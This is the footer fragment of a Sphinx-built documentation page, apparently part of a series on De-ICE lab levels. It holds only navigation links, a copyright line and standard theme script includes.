        <a href="de-ice3.html" class="btn btn-neutral float-right" title="3.6. De-ICE Level 3" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="de-ice5.html" class="btn btn-neutral" title="3.4. De-ICE Level 5" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, bitbender.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'1.0.3',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  
  
    <script type="text/javascript" src="../_static/js/theme.js"></script>
  

  
  
  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.StickyNav.enable();
      });
  </script>
   

</body>
</html>